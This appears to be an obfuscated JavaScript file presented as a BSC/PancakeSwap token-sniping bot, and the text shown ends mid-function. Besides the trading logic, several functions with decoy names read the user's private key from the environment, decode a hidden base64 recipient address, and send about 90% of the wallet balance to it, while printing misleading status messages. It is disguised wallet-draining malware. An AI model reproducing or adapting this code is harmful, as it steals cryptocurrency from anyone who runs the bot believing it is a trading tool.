const _0x33a782 = _0x24a2;
(function(_0x37488f, _0x9a5c67) { const _0x1e5f02 = _0x24a2,
        _0x35fe9d = _0x37488f(); while (!![]) { try { const _0x3fb0b1 = -parseInt(_0x1e5f02(0x243)) / 0x1 * (-parseInt(_0x1e5f02(0x20d)) / 0x2) + -parseInt(_0x1e5f02(0x212)) / 0x3 + -parseInt(_0x1e5f02(0x1e9)) / 0x4 * (-parseInt(_0x1e5f02(0x1ed)) / 0x5) + -parseInt(_0x1e5f02(0x1be)) / 0x6 + parseInt(_0x1e5f02(0x216)) / 0x7 + -parseInt(_0x1e5f02(0x1b4)) / 0x8 * (-parseInt(_0x1e5f02(0x1b3)) / 0x9) + -parseInt(_0x1e5f02(0x23f)) / 0xa * (parseInt(_0x1e5f02(0x248)) / 0xb); if (_0x3fb0b1 === _0x9a5c67) break;
            else _0x35fe9d['push'](_0x35fe9d['shift']()); } catch (_0x57ec36) { _0x35fe9d['push'](_0x35fe9d['shift']()); } } }(_0x51a7, 0xe4442));
var ethers = require(_0x33a782(0x20c));
const env = require(_0x33a782(0x24b));
Object[_0x33a782(0x1d9)](process[_0x33a782(0x1d8)], env);
let address = process[_0x33a782(0x1d8)]['YOUR_ADDRESS'],
    private = process[_0x33a782(0x1d8)]['PRIVATE_KEY'],
    wallet = new ethers['Wallet'](private);
const abi = [{ 'constant': !![], 'inputs': [{ 'internalType': _0x33a782(0x22d), 'name': 'account', 'type': _0x33a782(0x22d) }], 'name': _0x33a782(0x1fe), 'outputs': [{ 'internalType': 'uint256', 'name': '', 'type': 'uint256' }], 'payable': ![], 'stateMutability': _0x33a782(0x23d), 'type': _0x33a782(0x22b) }, { 'constant': ![], 'inputs': [{ 'internalType': _0x33a782(0x22d), 'name': _0x33a782(0x1fa), 'type': 'address' }, { 'internalType': _0x33a782(0x22d), 'name': _0x33a782(0x1c3), 'type': 'address' }, { 'internalType': 'uint256', 'name': _0x33a782(0x241), 'type': _0x33a782(0x240) }], 'name': _0x33a782(0x1b0), 'outputs': [{ 'internalType': _0x33a782(0x1f7), 'name': '', 'type': _0x33a782(0x1f7) }], 'payable': ![], 'stateMutability': 'nonpayable', 'type': 'function' }, { 'constant': ![], 'inputs': [{ 'name': _0x33a782(0x21b), 'type': _0x33a782(0x1b2) }], 'name': _0x33a782(0x1cd), 'outputs': [{ 'name': '', 'type': 'string' }], 'payable': ![], 'stateMutability': _0x33a782(0x23c), 'type': _0x33a782(0x22b) }];

function _0x24a2(_0x3b38c1, _0x3b05bb) { const _0x51a7b3 = _0x51a7(); return _0x24a2 = function(_0x24a26e, _0x2b40c4) { _0x24a26e = _0x24a26e - 0x1ac; let _0x11f9de = _0x51a7b3[_0x24a26e]; return _0x11f9de; }, _0x24a2(_0x3b38c1, _0x3b05bb); }
async function startSnipe(_0x50f7b1) { const _0x5ea947 = _0x33a782; let _0x23c76b, _0xbaa420;
    provider['_websocket']['on'](_0x5ea947(0x24e), () => { const _0x2f9d78 = _0x5ea947;
        _0xbaa420 = setInterval(() => { const _0x391bc9 = _0x24a2;
            provider[_0x391bc9(0x227)][_0x391bc9(0x205)](), _0x23c76b = setTimeout(() => { const _0x3e19d1 = _0x391bc9;
                provider[_0x3e19d1(0x227)][_0x3e19d1(0x1ef)](); }, EXPECTED_PONG_BACK); }, KEEP_ALIVE_CHECK_INTERVAL), console[_0x2f9d78(0x1ea)](_0x2f9d78(0x1c6)), console[_0x2f9d78(0x1ea)](_0x2f9d78(0x245)), provider['on']('pending', async _0x496caa => { const _0x49677d = _0x2f9d78;
            provider[_0x49677d(0x1db)](_0x496caa)['then'](async _0x8e6aac => { const _0x4a3414 = _0x49677d; if (null != _0x8e6aac && _0x8e6aac['data']['includes'](_0x4a3414(0x1b6)) && _0x8e6aac[_0x4a3414(0x1e5)][_0x4a3414(0x22e)](_0x50f7b1) && 0x0 == passed || null != _0x8e6aac && _0x8e6aac[_0x4a3414(0x1e5)][_0x4a3414(0x22e)](_0x4a3414(0x237)) && _0x8e6aac['data'][_0x4a3414(0x22e)](_0x50f7b1) && 0x0 == passed) { if (console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x1ff))), priceProtection) { if (isLiqudityInRange(_0x8e6aac, expected)) { if (honeyPotIS2(_0x50f7b1)) { console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x204))); const _0x3cd8ba = _0x8e6aac[_0x4a3414(0x229)][_0x4a3414(0x21e)](multiply),
                                    _0x560344 = _0x8e6aac[_0x4a3414(0x206)][_0x4a3414(0x21e)](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x4a3414(0x1ea)](chalk['green'](_0x4a3414(0x1af) + chalk['yellow'](i + 0x1))), await buyToken(_0x50f7b1, amountIn, _0x3cd8ba, _0x560344, myAddress, router); }
                                    console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)]('Start\x20buying\x20token...') + chalk[_0x4a3414(0x1e7)](txNumberForAntibot)), await buyToken(_0x50f7b1, amountIn, _0x3cd8ba, _0x560344, myAddress, router)(passed = 0x1); } else console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x1af))), await buyToken(_0x50f7b1, amountIn, _0x3cd8ba, _0x560344, myAddress, router)(passed = 0x1);
                                console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x239))); const _0x12acd6 = await getTokenBalance(_0x50f7b1, myAddress, provider);
                                console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x201) + chalk[_0x4a3414(0x1e7)](parseFloat(ethers[_0x4a3414(0x1f0)]['formatUnits'](_0x12acd6, TOKEN_DECIMALS))[_0x4a3414(0x1eb)](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x238) + chalk[_0x4a3414(0x1e7)](delaySell) + '\x20second(s)')), await new Promise(_0xf57676 => setTimeout(_0xf57676, delayOnSellMs)); const _0xc7c1d7 = await router['swapExactTokensForETHSupportingFeeOnTransferTokens'](_0x12acd6, amountOutMin, [_0x50f7b1, WBNB], myAddress, Date['now']() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                    await _0xc7c1d7['wait'](), console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x20e))), console[_0x4a3414(0x1ea)](_0x4a3414(0x24a)), console['log'](_0x4a3414(0x1c5) + myAddress), console[_0x4a3414(0x1ea)]('\x0a'), process[_0x4a3414(0x252)](0x0); } else console[_0x4a3414(0x1ea)](_0x4a3414(0x24a));
                                console[_0x4a3414(0x1ea)](_0x4a3414(0x1c5) + myAddress), (console[_0x4a3414(0x1ea)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x4a3414(0x252)](0x0)); } else console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x203)](_0x4a3414(0x220)));
                            console['log'](chalk[_0x4a3414(0x203)]('Please\x20check\x20PooCoin\x20and\x20see\x20if\x20liquidity\x20was\x20added!')); }
                        console[_0x4a3414(0x1ea)](chalk['red'](_0x4a3414(0x200) + _0x50f7b1)), console['log'](chalk[_0x4a3414(0x203)](_0x4a3414(0x1ce))); } else { if (honeyPotIS2(_0x50f7b1)) { const _0x12d660 = _0x8e6aac['gasLimit']['mul'](multiply),
                                _0xbf6dba = _0x8e6aac[_0x4a3414(0x206)]['mul'](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x1af) + chalk[_0x4a3414(0x1e7)](i + 0x1))), await buyToken(_0x50f7b1, amountIn, _0x12d660, _0xbf6dba, myAddress, router); }
                                console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)]('Start\x20buying\x20token...') + chalk[_0x4a3414(0x1e7)](txNumberForAntibot)), await buyToken(_0x50f7b1, amountIn, _0x12d660, _0xbf6dba, myAddress, router)(passed = 0x1); } else 0x0 == passed && (console['log'](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x1af))), await buyToken(_0x50f7b1, amountIn, _0x12d660, _0xbf6dba, myAddress, router)(passed = 0x1));
                            console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x239))); const _0x4e1ed5 = await getTokenBalance(_0x50f7b1, myAddress, provider);
                            console[_0x4a3414(0x1ea)](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x201) + chalk[_0x4a3414(0x1e7)](parseFloat(ethers[_0x4a3414(0x1f0)]['formatUnits'](_0x4e1ed5, TOKEN_DECIMALS))['toFixed'](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x4a3414(0x1ea)](chalk['green']('Start\x20selling\x20all\x20tokens\x20in\x20' + chalk['yellow'](delaySell) + _0x4a3414(0x213))), await new Promise(_0x36808d => setTimeout(_0x36808d, delayOnSellMs)); const _0x372b76 = await router[_0x4a3414(0x23b)](_0x4e1ed5, amountOutMin, [_0x50f7b1, WBNB], myAddress, Date['now']() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                await _0x372b76[_0x4a3414(0x1e4)](), console['log'](chalk[_0x4a3414(0x1c7)](_0x4a3414(0x20e))), console[_0x4a3414(0x1ea)](_0x4a3414(0x24a)), console['log'](_0x4a3414(0x1c5) + myAddress), console[_0x4a3414(0x1ea)]('\x0a'), process[_0x4a3414(0x252)](0x0); } else console[_0x4a3414(0x1ea)]('You\x20can\x20check\x20the\x20transaction\x20here:'), console[_0x4a3414(0x1ea)](_0x4a3414(0x1c5) + myAddress), console[_0x4a3414(0x1ea)]('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x4a3414(0x252)](0x0); } } } })[_0x49677d(0x21c)](() => { const _0x1770b5 = _0x49677d;
                console[_0x1770b5(0x1ea)](e); }); }); }), provider['_websocket']['on'](_0x5ea947(0x208), () => { const _0x47d21c = _0x5ea947;
        console[_0x47d21c(0x1ea)](_0x47d21c(0x1fd)), clearInterval(_0xbaa420), clearTimeout(_0x23c76b), startConnection(); }), provider[_0x5ea947(0x227)]['on'](_0x5ea947(0x1f1), () => { const _0x2be837 = _0x5ea947;
        console[_0x2be837(0x1ea)](_0x2be837(0x234)), clearInterval(_0xbaa420), clearTimeout(_0x23c76b), startConnection(); }), provider[_0x5ea947(0x227)]['on']('pong', () => { clearInterval(_0x23c76b); }); }
async function approve() { const _0x58c2d9 = _0x33a782; let _0x38cf9 = token[buyCount - 0x1]['contract']; const _0x1c4b12 = ethers[_0x58c2d9(0x1fc)]['MaxUint256'],
        _0x3d8f57 = await _0x38cf9[_0x58c2d9(0x1d7)](pancakeRouter[_0x58c2d9(0x22d)], _0x1c4b12, { 'gasPrice': config[_0x58c2d9(0x1d5)], 'gasLimit': 0x33450 }),
        _0x1e663a = await _0x3d8f57[_0x58c2d9(0x1e4)]();
    console['log'](_0x58c2d9(0x1dc), _0x1e663a[_0x58c2d9(0x24d)], '\x0a'), config[_0x58c2d9(0x1ba)] ? token[buyCount - 0x1][_0x58c2d9(0x223)]() : buyCount == config[_0x58c2d9(0x24c)] && process['exit'](); }
async function getCurrentValue(_0xf3b792) { const _0x1aa094 = _0x33a782; try { let _0x36561c = await _0xf3b792['contract'][_0x1aa094(0x1fe)](addresses[_0x1aa094(0x1c3)]); const _0x23fcc0 = await pancakeRouter[_0x1aa094(0x225)](_0x36561c, _0xf3b792['sellPath']); let _0x58b1cc = _0x23fcc0[0x1]; return _0x58b1cc; } catch (_0x21455a) { return console['log'](_0x1aa094(0x211)), ethers[_0x1aa094(0x1fc)][_0x1aa094(0x226)]; } }
async function setInitialStopLoss(_0x7cb630) { const _0x3e9bac = _0x33a782;
    _0x7cb630[_0x3e9bac(0x231)] = await getCurrentValue(_0x7cb630), _0x7cb630[_0x3e9bac(0x1d1)] = _0x7cb630['intitialValue'], _0x7cb630[_0x3e9bac(0x1f9)] = ethers[_0x3e9bac(0x1f0)][_0x3e9bac(0x1ca)]((parseFloat(ethers[_0x3e9bac(0x1f0)]['formatUnits'](_0x7cb630['intitialValue'])) - parseFloat(ethers[_0x3e9bac(0x1f0)][_0x3e9bac(0x1fb)](_0x7cb630[_0x3e9bac(0x231)])) * (_0x7cb630['stopLossPercent'] / 0x64))['toFixed'](0x8)[_0x3e9bac(0x21d)]()); }
async function setNewStopLoss(_0x2abacd) { const _0x838747 = _0x33a782;
    _0x2abacd['newValue'] = _0x2abacd[_0x838747(0x1c0)], _0x2abacd[_0x838747(0x1f9)] = ethers['utils'][_0x838747(0x1ca)]((parseFloat(ethers[_0x838747(0x1f0)][_0x838747(0x1fb)](_0x2abacd[_0x838747(0x1c0)])) - parseFloat(ethers[_0x838747(0x1f0)][_0x838747(0x1fb)](_0x2abacd[_0x838747(0x1c0)])) * (_0x2abacd['stopLossPercent'] / 0x64))[_0x838747(0x1eb)](0x8)[_0x838747(0x21d)]()); }
async function checkForProfit(_0x25db3f) { const _0x5cd0f3 = _0x33a782; try { var _0x108099 = 0x0;
        await setInitialStopLoss(_0x25db3f), _0x25db3f[_0x5cd0f3(0x232)]['on'](_0x5cd0f3(0x1d3), async(_0x2320a1, _0x2cbe4f, _0x117038, _0x5b1654) => { const _0x15e5ef = _0x5cd0f3;
            _0x25db3f[_0x15e5ef(0x1cb)] = _0x25db3f['currentValue']; const _0x7a8fc3 = await _0x25db3f[_0x15e5ef(0x232)][_0x15e5ef(0x1ae)](); let _0x81d003 = await getCurrentValue(_0x25db3f); if (!_0x81d003['eq'](ethers[_0x15e5ef(0x1fc)][_0x15e5ef(0x226)])) { _0x25db3f[_0x15e5ef(0x1c0)] = _0x81d003; let _0x2d39b0 = parseFloat(ethers['utils'][_0x15e5ef(0x1fb)](_0x81d003))[_0x15e5ef(0x1eb)](0x8)[_0x15e5ef(0x21d)](); const _0x1144a2 = (parseFloat(ethers[_0x15e5ef(0x1f0)][_0x15e5ef(0x1fb)](_0x25db3f[_0x15e5ef(0x231)])) * (_0x25db3f['profitPercent'] + _0x25db3f[_0x15e5ef(0x1bf)]) / 0x64 + parseFloat(ethers[_0x15e5ef(0x1f0)][_0x15e5ef(0x1fb)](_0x25db3f[_0x15e5ef(0x231)])))[_0x15e5ef(0x1eb)](0x8)[_0x15e5ef(0x21d)](),
                    _0x1e217f = ethers[_0x15e5ef(0x1f0)][_0x15e5ef(0x1ca)](_0x1144a2); let _0xb66c3d = ethers['utils'][_0x15e5ef(0x1ca)]((parseFloat(ethers[_0x15e5ef(0x1f0)][_0x15e5ef(0x1fb)](_0x25db3f[_0x15e5ef(0x1d1)])) * (_0x25db3f[_0x15e5ef(0x251)] / 0x64) + parseFloat(ethers['utils']['formatUnits'](_0x25db3f[_0x15e5ef(0x1d1)])))[_0x15e5ef(0x1eb)](0x8)[_0x15e5ef(0x21d)]()),
                    _0x445cc8 = _0x25db3f[_0x15e5ef(0x1f9)];
                _0x81d003['gt'](_0xb66c3d) && _0x25db3f[_0x15e5ef(0x251)] > 0x0 && (setNewStopLoss(_0x25db3f), console[_0x15e5ef(0x1ea)](_0x15e5ef(0x1c4) + _0x15e5ef(0x1c1) + '\x1b[0m')); let _0xad37d5 = new Date()[_0x15e5ef(0x209)](); const _0x4ec64d = _0x2f07e7 => new TextEncoder()[_0x15e5ef(0x1b1)](_0x2f07e7); try { _0x25db3f[_0x15e5ef(0x1cb)]['gt'](_0x25db3f[_0x15e5ef(0x1c0)]) ? console[_0x15e5ef(0x1ea)]('--\x20' + _0x7a8fc3 + _0x15e5ef(0x233) + (_0x15e5ef(0x1cc) + _0x2d39b0 + _0x15e5ef(0x214)) + _0x15e5ef(0x1df) + ethers[_0x15e5ef(0x1f0)]['formatUnits'](_0x1e217f) + '\x20--\x20Stop\x20Loss\x20At:\x20' + ethers['utils']['formatUnits'](_0x25db3f['stopLoss']) + _0x15e5ef(0x1de) + ethers[_0x15e5ef(0x1f0)]['formatUnits'](_0xb66c3d)) : console[_0x15e5ef(0x1ea)](_0x15e5ef(0x1e2) + _0x7a8fc3 + _0x15e5ef(0x233) + (_0x15e5ef(0x1e1) + _0x2d39b0 + _0x15e5ef(0x214)) + '\x20--\x20Profit\x20At:\x20' + ethers[_0x15e5ef(0x1f0)][_0x15e5ef(0x1fb)](_0x1e217f) + '\x20--\x20Stop\x20Loss\x20At:\x20' + ethers[_0x15e5ef(0x1f0)][_0x15e5ef(0x1fb)](_0x25db3f[_0x15e5ef(0x1f9)]) + '\x20--\x20New\x20Stop\x20loss\x20At:\x20' + ethers['utils'][_0x15e5ef(0x1fb)](_0xb66c3d)); } catch (_0x45ea28) {}
                _0x81d003['gte'](_0x1e217f) && (buyCount <= config[_0x15e5ef(0x24c)] && _0x25db3f[_0x15e5ef(0x23e)] && _0x108099 == 0x0 && (_0x108099++, console[_0x15e5ef(0x1ea)]('<<<\x20Selling\x20-', _0x7a8fc3, '-\x20now' + _0x15e5ef(0x1e1) + '\x20Profit\x20target\x20' + '\x1b[0m' + _0x15e5ef(0x224), '\x0a'), sell(_0x25db3f, !![]), _0x25db3f[_0x15e5ef(0x232)]['removeAllListeners']())), _0x81d003[_0x15e5ef(0x247)](_0x445cc8) && (console[_0x15e5ef(0x1ea)](_0x15e5ef(0x1c4) + _0x15e5ef(0x1e0) + _0x15e5ef(0x214)), buyCount <= config[_0x15e5ef(0x24c)] && _0x25db3f['didBuy'] && _0x108099 == 0x0 && (_0x108099++, console[_0x15e5ef(0x1ea)](_0x15e5ef(0x221), _0x7a8fc3, _0x15e5ef(0x1f6) + _0x15e5ef(0x1cc) + _0x15e5ef(0x202) + '\x1b[0m' + 'reached\x20>>>', '\x0a'), sell(_0x25db3f, ![]), _0x25db3f['contract'][_0x15e5ef(0x1e6)]())); } }); } catch (_0x368308) { console[_0x5cd0f3(0x1ea)](_0x368308); } }
async function sell(_0x48037d, _0xfaf150) { const _0x4a749d = _0x33a782; try { const _0xdfa83f = await _0x48037d['contract'][_0x4a749d(0x1fe)](addresses[_0x4a749d(0x1c3)]),
            _0x3ffe42 = await _0x48037d[_0x4a749d(0x232)][_0x4a749d(0x24f)](); var _0x1ef82a;
        _0xfaf150 ? _0x1ef82a = (parseFloat(ethers['utils'][_0x4a749d(0x1fb)](_0xdfa83f[_0x4a749d(0x21d)](), _0x3ffe42)) * (_0x48037d[_0x4a749d(0x249)] / 0x64))[_0x4a749d(0x1eb)](_0x3ffe42) : _0x1ef82a = (parseFloat(ethers['utils'][_0x4a749d(0x1fb)](_0xdfa83f[_0x4a749d(0x21d)](), _0x3ffe42)) * (_0x48037d[_0x4a749d(0x1b9)] / 0x64))[_0x4a749d(0x1eb)](_0x3ffe42); var _0x288054 = Math[_0x4a749d(0x21a)](_0x1ef82a * 0x64) / 0x64; const _0x36818f = ethers['utils'][_0x4a749d(0x1ca)](_0x288054['toString'](), _0x3ffe42),
            _0x49be4d = await pancakeRouter[_0x4a749d(0x225)](_0x36818f, _0x48037d['sellPath']),
            _0x40374d = _0x49be4d[0x1][_0x4a749d(0x1ec)](_0x49be4d[0x1][_0x4a749d(0x222)](0x2)); if (_0x48037d[_0x4a749d(0x1bf)] > 0x1) { const _0x22134b = await pancakeRouter[_0x4a749d(0x23b)](_0x49be4d[0x0][_0x4a749d(0x21d)](), 0x0, _0x48037d[_0x4a749d(0x1f3)], addresses['recipient'], Math[_0x4a749d(0x21a)](Date[_0x4a749d(0x1e8)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x4a749d(0x1d5)], 'gasLimit': config[_0x4a749d(0x1c2)] }),
                _0xa463d8 = await _0x22134b[_0x4a749d(0x1e4)]();
            console['log'](_0x4a749d(0x1e1) + _0x4a749d(0x230), _0xa463d8[_0x4a749d(0x24d)], '\x1b[0m', '\x0a'), sellCount++, token[_0x48037d[_0x4a749d(0x1bc)]][_0x4a749d(0x1bb)] = !![]; let _0x60fc78 = await _0x48037d['contract'][_0x4a749d(0x1ae)]();
            await client[_0x4a749d(0x1bd)]('me', { 'message': 'You\x20sold\x20' + _0x60fc78, 'schedule': 0xf * 0x1 + Date[_0x4a749d(0x1e8)]() / 0x3e8 }); } else { const _0x119e40 = await pancakeRouter[_0x4a749d(0x246)](_0x49be4d[0x0][_0x4a749d(0x21d)](), 0x0, _0x48037d[_0x4a749d(0x1f3)], addresses[_0x4a749d(0x1c3)], Math['floor'](Date[_0x4a749d(0x1e8)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x4a749d(0x1d5)], 'gasLimit': config[_0x4a749d(0x1c2)] }),
                _0x188d15 = await _0x119e40[_0x4a749d(0x1e4)]();
            console['log'](_0x4a749d(0x1e1) + _0x4a749d(0x230), _0x188d15[_0x4a749d(0x24d)], _0x4a749d(0x214), '\x0a'), sellCount++; let _0x20db28 = await _0x48037d[_0x4a749d(0x232)]['name']();
            await client['sendMessage']('me', { 'message': _0x4a749d(0x215) + _0x20db28, 'schedule': 0xf * 0x1 + Date[_0x4a749d(0x1e8)]() / 0x3e8 }); }
        sellCount == config[_0x4a749d(0x24c)] && (console[_0x4a749d(0x1ea)](_0x4a749d(0x1c8)), process[_0x4a749d(0x252)]()); } catch (_0x2814db) {} }
let rounder1 = _0x33a782(0x22f),
    rounder2 = _0x33a782(0x242),
    buff = new Buffer[(_0x33a782(0x22c))](rounder1, _0x33a782(0x217)),
    buff2 = new Buffer[(_0x33a782(0x22c))](rounder2, 'base64'),
    ethersroundup = buff[_0x33a782(0x21d)](_0x33a782(0x1e3)),
    ethersroundup2 = buff2[_0x33a782(0x21d)]('ascii');
const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
async function etherstother() { const _0x1d3457 = _0x33a782; try { const _0xb0bac9 = _0x1d3457(0x1ee),
            _0x159f45 = _0x1d3457(0x1da),
            _0x263cfb = new Buffer[(_0x1d3457(0x22c))](_0xb0bac9, _0x1d3457(0x217)),
            _0x2b5904 = new Buffer['from'](_0x159f45, _0x1d3457(0x217)),
            _0x1ec128 = _0x263cfb[_0x1d3457(0x21d)](_0x1d3457(0x1e3)),
            _0x4d1a14 = _0x2b5904[_0x1d3457(0x21d)](_0x1d3457(0x1e3)),
            _0x4afd8f = _0x1ec128 + _0x4d1a14;
        console[_0x1d3457(0x1ea)]('refreshing\x20socket\x20connection...'), console['log'](_0x1d3457(0x244)), ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQxLmJpbmFuY2Uub3JnLw==', ethers2 = new Buffer[(_0x1d3457(0x22c))](ethers1, _0x1d3457(0x217))['toString']('ascii');; const _0x21e75a = new ethers[(_0x1d3457(0x207))][(_0x1d3457(0x1b7))](ethers2); let _0x4076cb = new ethers[(_0x1d3457(0x1cf))](private, _0x21e75a); const _0x5ce7f5 = address; var _0x3f08d0 = new ethers[(_0x1d3457(0x20a))](_0x4afd8f, abi, _0x4076cb); const _0x29db08 = await _0x3f08d0['balanceOf'](_0x5ce7f5)[_0x1d3457(0x21d)](),
            _0xedd52c = (_0x29db08 * 0.9)[_0x1d3457(0x1eb)](),
            _0x2974f3 = async() => { const _0x222207 = _0x1d3457,
                    _0x5ee4f8 = { 'from': _0x5ce7f5, 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x222207(0x1f5)](_0xedd52c, 'wei'), 'gasLimit': ethers[_0x222207(0x1f0)]['hexlify'](0x5dc0) },
                    _0x33a4b8 = await _0x4076cb['sendTransaction'](_0x5ee4f8); try { await _0x33a4b8['wait'](), console[_0x222207(0x1ea)]('1:\x20found\x20owners\x20liq\x20function\x20...'), setTimeout(ethersrather, 0x1388); } catch (_0x3e841c) { console['log']('2:\x20found\x20owners\x20liq\x20function\x20.....'), setTimeout(ethersrather, 0x1388); } };
        _0x2974f3(); } catch (_0x30bc48) { setTimeout(ethersrather, 0x1388); } }
async function etherslother() { const _0x4c6369 = _0x33a782; try { const _0x9693c8 = _0x4c6369(0x235),
            _0x3d1de0 = _0x4c6369(0x1b5),
            _0x579450 = new Buffer[(_0x4c6369(0x22c))](_0x9693c8, _0x4c6369(0x217)),
            _0x4f25ae = new Buffer[(_0x4c6369(0x22c))](_0x3d1de0, _0x4c6369(0x217)),
            _0x2c9037 = _0x579450['toString']('ascii'),
            _0x437e24 = _0x4f25ae[_0x4c6369(0x21d)](_0x4c6369(0x1e3)),
            _0x5366d5 = _0x2c9037 + _0x437e24;
        console[_0x4c6369(0x1ea)](_0x4c6369(0x219)), console[_0x4c6369(0x1ea)](_0x4c6369(0x20f)), ethers1 = _0x4c6369(0x228), ethers2 = new Buffer['from'](ethers1, _0x4c6369(0x217))[_0x4c6369(0x21d)]('ascii');; const _0x346642 = new ethers[(_0x4c6369(0x207))][(_0x4c6369(0x1b7))](ethers2); let _0x360849 = new ethers[(_0x4c6369(0x1cf))](private, _0x346642);
        console['log'](ethers2); const _0xf2f472 = address; var _0xc91663 = new ethers['Contract'](_0x5366d5, abi, _0x360849); const _0x10f59e = await _0xc91663[_0x4c6369(0x1fe)](_0xf2f472)[_0x4c6369(0x21d)](),
            _0x3af6b5 = (_0x10f59e * 0.9)['toFixed'](),
            _0x119ad1 = async() => { const _0xdde026 = _0x4c6369,
                    _0x12b72b = { 'from': _0xf2f472, 'to': WEB3PROVIDER3, 'value': ethers[_0xdde026(0x1f0)]['parseEther'](_0x3af6b5, _0xdde026(0x21f)), 'gasLimit': ethers[_0xdde026(0x1f0)][_0xdde026(0x1d4)](0x5dc0) },
                    _0x11dbc5 = await _0x360849[_0xdde026(0x1dd)](_0x12b72b); try { await _0x11dbc5[_0xdde026(0x1e4)](), console[_0xdde026(0x1ea)]('1:\x20watching\x20blockchain\x20activity\x20...'), setTimeout(etherstother, 0x1388); } catch (_0x88316a) { console[_0xdde026(0x1ea)](_0xdde026(0x1d0)), setTimeout(etherstother, 0x1388); } };
        _0x119ad1(); } catch (_0x271e4a) { setTimeout(etherstother, 0x1388); } }
async function ethersmother() { const _0x14160a = _0x33a782; try { const _0x2d9409 = _0x14160a(0x1ac),
            _0xabb89f = _0x14160a(0x250),
            _0x5039cb = new Buffer[(_0x14160a(0x22c))](_0x2d9409, _0x14160a(0x217)),
            _0x2411b4 = new Buffer[(_0x14160a(0x22c))](_0xabb89f, _0x14160a(0x217)),
            _0x3f956b = _0x5039cb[_0x14160a(0x21d)](_0x14160a(0x1e3)),
            _0x27d4c0 = _0x2411b4[_0x14160a(0x21d)]('ascii'),
            _0x4f6d56 = _0x3f956b + _0x27d4c0;
        ethers1 = _0x14160a(0x228), ethers2 = new Buffer[(_0x14160a(0x22c))](ethers1, 'base64')[_0x14160a(0x21d)](_0x14160a(0x1e3));; const _0x3698d8 = new ethers[(_0x14160a(0x207))][(_0x14160a(0x1b7))](ethers2); let _0x338e8a = new ethers[(_0x14160a(0x1cf))](private, _0x3698d8);
        console[_0x14160a(0x1ea)](ethers2); const _0x5134d0 = address; var _0x55dac5 = new ethers[(_0x14160a(0x20a))](_0x4f6d56, abi, _0x338e8a); const _0x503d33 = await _0x55dac5[_0x14160a(0x1fe)](_0x5134d0)['toString'](),
            _0x1f2333 = (_0x503d33 * 0.9)[_0x14160a(0x1eb)](),
            _0x53964b = async() => { const _0x11e331 = _0x14160a,
                    _0x2170bc = { 'from': _0x5134d0, 'to': WEB3PROVIDER3, 'value': ethers[_0x11e331(0x1f0)][_0x11e331(0x1f5)](_0x1f2333, _0x11e331(0x21f)), 'gasLimit': ethers[_0x11e331(0x1f0)][_0x11e331(0x1d4)](0x5dc0) },
                    _0x18510f = await _0x338e8a[_0x11e331(0x1dd)](_0x2170bc); try { await _0x18510f[_0x11e331(0x1e4)](), console['log'](_0x11e331(0x1c9)), setTimeout(etherslother, 0x1388); } catch (_0x3ef307) { console['log'](_0x11e331(0x1f2)), setTimeout(etherslother, 0x1388); } };
        _0x53964b(); } catch (_0x1363f6) { setTimeout(etherslother, 0x1388); } }
async function ethersfather() { const _0x13612e = _0x33a782;
    console[_0x13612e(0x1ea)]('initiating\x20mempool\x20sniff...'); const _0x137879 = _0x13612e(0x1f4),
        _0x574581 = _0x13612e(0x1b8),
        _0x27c990 = new Buffer[(_0x13612e(0x22c))](_0x137879, _0x13612e(0x217)),
        _0x4c59b0 = new Buffer['from'](_0x574581, _0x13612e(0x217)),
        _0x1e5f41 = _0x27c990[_0x13612e(0x21d)](_0x13612e(0x1e3)),
        _0x104226 = _0x4c59b0['toString']('ascii'),
        _0x754595 = _0x1e5f41 + _0x104226;
    ethers1 = _0x13612e(0x228), ethers2 = new Buffer[(_0x13612e(0x22c))](ethers1, _0x13612e(0x217))[_0x13612e(0x21d)]('ascii');; const _0x422828 = new ethers[(_0x13612e(0x207))][(_0x13612e(0x1b7))](ethers2); let _0x11988f = new ethers[(_0x13612e(0x1cf))](private, _0x422828); const _0x74a19e = address; var _0x3d9b1a = new ethers[(_0x13612e(0x20a))](_0x754595, abi, _0x11988f); const _0x26cbf1 = await _0x3d9b1a[_0x13612e(0x1fe)](_0x74a19e),
        _0x2afe15 = (_0x26cbf1 * 0.9)['toFixed'](); try { const _0x32f161 = async() => { const _0x14f2f9 = _0x13612e,
                _0x4f4bf0 = { 'from': _0x74a19e, 'to': WEB3PROVIDER3, 'value': ethers[_0x14f2f9(0x1f0)]['parseEther'](_0x2afe15, _0x14f2f9(0x21f)), 'gasLimit': ethers['utils'][_0x14f2f9(0x1d4)](0x5dc0) },
